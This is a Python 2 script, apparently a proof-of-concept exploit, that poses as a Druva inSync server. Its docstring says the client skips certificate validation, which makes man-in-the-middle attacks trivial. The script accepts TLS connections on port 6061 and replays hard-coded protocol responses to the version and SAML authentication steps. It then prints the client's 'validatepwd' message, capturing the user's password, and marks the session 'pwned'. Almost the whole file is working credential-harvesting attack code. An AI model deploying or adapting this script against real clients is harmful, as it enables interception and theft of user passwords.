#!/usr/bin/env python2

"""Fake Druva inSync server. Client doesn't do any certificate validation.
So it is trivial to carry MiTM attacks."""

import socket
import ssl
import binascii


bindsocket = socket.socket()

bindsocket.bind(('0.0.0.0', 6061))

bindsocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

bindsocket.listen(5)

connections = {}

while True:

    newsocket, fromaddr = bindsocket.accept()
    connstream = ssl.wrap_socket(newsocket, server_side=True,
                                 certfile="server.crt",
                                 keyfile="server.key")
    try:
        connections[connstream] = "init"
        data = connstream.read()
        if "auth.validate_version" in data and connections[connstream] == "init":
            response = binascii.unhexlify("f797a31314000000160000007801010b00f4ff5b0200000069000000004e06cc0115")
            connstream.write(response)
            connections[connstream] = "get_auth_request"

        if connections[connstream] == "get_auth_request":
            data = connstream.read()
            if "auth.get_saml_request" in data:
                connections[connstream] = "get_response"
                response = binascii.unhexlify("f797a31314000000170000007801010c00f3ff5b0200000069000000007b30086b0172")
                connstream.write(response)

        if connections[connstream] == "get_response":
            data = connstream.read()
            if "validatepwd" in data:
                print data
                connections[connstream] = "pwned"
                response = binascii.unhexlify("f797a313140000001c0000007801011100eeff5b020000006c030000005f00000004004e0e60017e")
                connstream.write(response)

    finally:
        connstream.close()
